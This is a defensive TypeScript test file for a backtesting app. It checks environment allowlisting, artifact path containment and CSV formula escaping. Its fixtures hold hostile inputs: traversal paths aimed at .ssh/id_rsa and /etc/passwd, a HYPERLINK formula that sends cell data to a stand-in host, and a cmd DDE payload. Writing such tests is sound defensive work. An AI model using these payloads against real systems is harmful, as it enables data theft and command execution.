import assert from "node:assert/strict";
import { execFile } from "node:child_process";
import { mkdir, rm, symlink, writeFile } from "node:fs/promises";
import { join } from "node:path";
import test from "node:test";
import { promisify } from "node:util";
import { backtestEnv, isInside } from "../src/lib/backtesting/executor";
import { backtestArtifactFileName, csvEscape, mergeBacktestCsvs, storedBacktestFile } from "../src/lib/export/research-package-generator";

test("model-written backtest code gets an allowlisted environment without keys or DATABASE_URL (#11)", async () => {
  const env = backtestEnv({ PATH: "/usr/bin:/bin", HOME: "/home/dev", LANG: "C", DATABASE_URL: "postgres://secret", ANTHROPIC_API_KEY: "a",
    OPENCODE_GO_API_KEY: "o", RESEARCH_MODEL_API_KEY: "r", RESEARCH_WEB_SEARCH_API_KEY: "w", AWS_SECRET_ACCESS_KEY: "s" });
  assert.deepEqual(Object.keys(env).sort(), ["HOME", "LANG", "PATH", "PYTHONPATH"]);
  assert.equal(env.PYTHONPATH, process.cwd());

  // What the python3 child actually sees.
  const saved = { DATABASE_URL: process.env.DATABASE_URL, ANTHROPIC_API_KEY: process.env.ANTHROPIC_API_KEY };
  process.env.DATABASE_URL = "postgres://secret";
  process.env.ANTHROPIC_API_KEY = "fixture-key";
  try {
    const { stdout } = await promisify(execFile)("python3", ["-c", "import json, os; print(json.dumps(sorted(os.environ)))"], { env: backtestEnv() });
    const names: string[] = JSON.parse(stdout);
    assert.equal(names.includes("DATABASE_URL"), false);
    assert.equal(names.includes("ANTHROPIC_API_KEY"), false);
    assert.ok(names.includes("PATH"));
  } finally {
    for (const [key, value] of Object.entries(saved)) {
      if (value === undefined) delete process.env[key];
      else process.env[key] = value;
    }
  }
});

test("backtest artifact paths must stay inside the backtest storage tree (S6)", async () => {
  const artifactDir = join(process.cwd(), "storage", "backtests", "run", "bt");
  assert.equal(isInside(artifactDir, "storage/backtests/run/bt/metrics.json"), true);
  for (const path of [".env.local", "../../.ssh/id_rsa", "/etc/passwd", "storage/backtests/run/bt", "storage/backtests/run/other/metrics.json",
    "storage/backtests/run/bt/../../../../.env.local"]) {
    assert.equal(isInside(artifactDir, path), false, path);
  }

  const id = crypto.randomUUID();
  const dir = join(process.cwd(), "storage", "backtests", id);
  await mkdir(dir, { recursive: true });
  try {
    await writeFile(join(dir, "metrics.json"), "{}");
    await symlink(join(process.cwd(), "package.json"), join(dir, "leak.json"));
    assert.ok(await storedBacktestFile(`storage/backtests/${id}/metrics.json`));
    for (const path of ["package.json", ".env.local", `storage/backtests/${id}/../../../package.json`, `storage/backtests/${id}/leak.json`,
      `storage/backtests/${id}/missing.json`, "/etc/hosts"]) {
      assert.equal(await storedBacktestFile(path), null, path);
    }
  } finally {
    await rm(dir, { recursive: true, force: true });
  }
});

test("CSV cells that a spreadsheet would run as formulas are kept as text (S7)", () => {
  for (const value of ['=HYPERLINK("https://x.example/?d="&B2,"source")', "+cmd|' /C calc'!A0", "-2+3", "@SUM(A1:A9)", "\t=1", "\r=1"]) {
    assert.equal(csvEscape(value), `"'${value.replace(/"/g, '""')}"`, JSON.stringify(value));
  }
  for (const [value, expected] of [[-12.5, '"-12.5"'], ["-12.5", '"-12.5"'], ["-1e-7", '"-1e-7"'], ["+4", '"+4"'], [42, '"42"'],
    [null, '""'], ['say "hi"', '"say ""hi"""'], ["a=b", '"a=b"']] as const) {
    assert.equal(csvEscape(value), expected, String(value));
  }
});

test("merged backtest CSVs escape every cell and keep one header (#135)", () => {
  const merged = mergeBacktestCsvs([
    { backtestRunId: "bt-1", content: 'date,equity\n2024-01-02,100\n2024-01-03,=HYPERLINK("https://x.example")\n' },
    { backtestRunId: "bt-2", content: 'date,equity,note\r\n2024-01-02,-5,"a, ""quoted"" note"\r\n\r\n' },
  ]);
  assert.equal(merged, [
    '"backtest_run_id","date","equity","note"',
    '"bt-1","2024-01-02","100",""',
    '"bt-1","2024-01-03","\'=HYPERLINK(https://x.example)",""',
    '"bt-2","2024-01-02","-5","a, ""quoted"" note"',
    "",
  ].join("\n"));
});

test("copied backtest artifacts keep their extension and never share a file name (#135)", () => {
  const used = new Set<string>();
  const name = (title: string, storage_path: string) => backtestArtifactFileName({ title, storage_path, backtest_run_id: "bt-1" }, used);
  assert.equal(name("metrics.json", "storage/backtests/r/bt-1/metrics.json"), "bt_1_metrics.json");
  assert.equal(name("metrics.json", "storage/backtests/r/bt-1/metrics.json"), "bt_1_metrics_2.json");
  assert.equal(name("Strategy code", "storage/backtests/r/bt-1/strategy.py"), "bt_1_strategy_code.py");
  assert.equal(name("runner log", "storage/backtests/r/bt-1/runner"), "bt_1_runner_log");
});
